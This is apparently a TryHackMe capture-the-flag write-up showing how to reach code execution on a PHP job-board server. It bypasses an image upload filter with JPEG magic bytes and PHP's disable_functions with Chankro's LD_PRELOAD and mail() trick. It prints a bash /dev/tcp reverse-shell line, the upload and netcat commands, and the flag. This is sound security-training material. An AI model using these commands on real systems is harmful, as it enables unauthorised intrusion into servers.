# Bypass Disable Functions

| | |
|---|---|
| **Platform** | TryHackMe |
| **Link** | https://tryhackme.com/room/bypassdisablefunctions |
| **Difficulty** | Easy |
| **Category** | Web |
| **Date** | 2026-07-11 |
| **Time spent** | ~ 1.5 h |

---

## Challenge Description

The target is a job board web application. The goal is to achieve remote code execution on the server despite PHP's `disable_functions` configuration blocking the most common command execution functions. The challenge introduces the technique of abusing `mail()` and `putenv()` via the [Chankro](https://github.com/TarlogicSecurity/Chankro) tool to bypass these restrictions.

---

## Process

### Reconnaissance

I started with an nmap scan to identify open services on the target.

```bash
nmap -sV 10.113.173.222
```

![nmap scan results showing port 22 SSH and port 80 HTTP open](images/easy-web-bypass-disable-functions-01.png)

Two ports were open: SSH on port 22 and Apache HTTP on port 80. The HTTP service was the primary attack surface.

---

### Enumeration

I visited the web application — a job board called "Ecorp Jobs" — and then ran gobuster to discover hidden directories and PHP files.

```bash
gobuster dir -u http://10.113.173.222 -w /usr/share/wordlists/dirb/common.txt -x php
```

![gobuster output showing cv.php, phpinfo.php, and uploads/ directory](images/easy-web-bypass-disable-functions-02.png)

Three interesting findings:
- `cv.php` — a file upload form
- `phpinfo.php` — exposes server configuration
- `uploads/` — where uploaded files are stored

I visited the application homepage and then `cv.php`.

![Ecorp Jobs homepage](images/easy-web-bypass-disable-functions-03.png)

![cv.php upload form with "Send your cv in image format" and "Upload a real image" message](images/easy-web-bypass-disable-functions-04.png)

The upload form explicitly asks for an image. This suggested server-side validation checking file content — not just the extension or Content-Type header.

I then checked `phpinfo.php` to understand the server configuration.

![phpinfo.php general information — PHP 7.0.33, Apache 2.4.18, Ubuntu](images/easy-web-bypass-disable-functions-05.png)

![phpinfo.php showing disable_functions list — exec, system, shell_exec, proc_open and many pcntl functions disabled](images/easy-web-bypass-disable-functions-06.png)

Two critical pieces of information:
- `disable_functions` blocks `exec`, `system`, `shell_exec`, `proc_open`, and all `pcntl_*` functions
- `mail()` and `putenv()` are **not** in the list — this is the attack vector

![phpinfo.php Apache Environment section showing DOCUMENT_ROOT = /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db](images/easy-web-bypass-disable-functions-13.png)

The `DOCUMENT_ROOT` value was not the default `/var/www/html` but included a hash subdirectory: `/var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db`. This path is essential for Chankro to work correctly.

---

### Initial Access — Bypassing the Upload Filter

The upload filter checks the file's actual content (magic bytes), not just its extension or Content-Type. A JPEG file always starts with the bytes `FF D8 FF`. By prepending these bytes to a PHP file, the server's content check passes while the file remains valid PHP.

I first tried uploading a plain PHP file — the server rejected it with "Upload a real image". After prepending the JPEG magic bytes via `curl` with a spoofed `Content-Type`, the upload succeeded.

![cv.php showing OK response after successful upload](images/easy-web-bypass-disable-functions-07.png)

However, visiting the uploaded file in `/uploads/` only returned the raw bytes — Apache is configured to **not execute PHP** in that directory.

---

### Exploitation — Chankro

Since standard PHP execution functions are disabled and the uploads directory doesn't execute PHP, I used [Chankro](https://github.com/TarlogicSecurity/Chankro) — a tool that exploits `putenv()` and `mail()` to achieve code execution.

**How it works:**
1. Chankro generates a PHP file that uses `putenv()` to set `LD_PRELOAD` to a custom `.so` library
2. It then calls `mail()`, which spawns a process that loads our library first
3. The library executes our payload (a bash reverse shell)

**Step 1 — Create the reverse shell payload:**

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.143.80/4444 0>&1
```

![shell.sh content and file type confirmation](images/easy-web-bypass-disable-functions-14.png)

**Step 2 — Generate the PHP dropper with Chankro:**

```bash
python2 chankro.py --arch 64 --input shell.sh --output tryhackme.php \
  --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db/uploads
```

The `--path` argument must point to the exact directory where the file will be uploaded — this is where Chankro will write the `.so` library and the payload at runtime.

![Chankro directory contents, command execution, and magic byte prepending](images/easy-web-bypass-disable-functions-15.png)

**Step 3 — Prepend JPEG magic bytes to pass the upload filter:**

```bash
echo -e '\xff\xd8\xff' | cat - tryhackme.php > tryhackme_final.php
```

The `file` command confirms the output is recognized as JPEG image data while still containing valid PHP code.

**Step 4 — Upload the file:**

```bash
curl -F "file=@tryhackme_final.php;type=image/jpeg" http://10.113.173.222/cv.php
```

**Step 5 — Set up netcat and trigger execution:**

```bash
nc -lvnp 4444
```

Then visit `http://10.113.173.222/uploads/tryhackme_final.php` in the browser to trigger the PHP execution.

![Netcat receiving the reverse shell connection from the server](images/easy-web-bypass-disable-functions-16.png)

A shell connected as `www-data`.

---

### Post Exploitation

With the shell active, I searched for the flag:

```bash
find / -type f -name "flag.txt" 2>/dev/null
```

![find output showing /home/s4vi/flag.txt, cat command, and flag value thm{bypass_d1sable_functions_1n_php}](images/easy-web-bypass-disable-functions-17.png)

Flag: `thm{bypass_d1sable_functions_1n_php}`

---

## Lessons Learned

**`phpinfo.php` is a critical recon target.** It exposed two things that made this attack possible: the exact `DOCUMENT_ROOT` path (required by Chankro) and the `disable_functions` list (confirming `mail()` was available).

**Magic bytes bypass content-based filters.** Prepending `\xff\xd8\xff` makes a PHP file pass JPEG validation. The check looks at file content, not extension — but it only checks the beginning of the file.

**`disable_functions` is not a complete sandbox.** Administrators often disable the obvious functions (`system`, `exec`, `shell_exec`) but miss less common ones. `mail()` combined with `putenv()` and `LD_PRELOAD` is a well-known but often overlooked bypass path.

**The upload directory execution policy matters.** Even with a valid PHP file uploaded, execution depends on Apache's configuration for that directory. In this case, Chankro bypassed the issue by using `mail()` to spawn an external process rather than relying on direct PHP function calls.

**Check what is NOT disabled.** The absence of `mail()` from `disable_functions` was the key signal. When enumerating a PHP server, look for what the admin forgot — not just what they blocked.
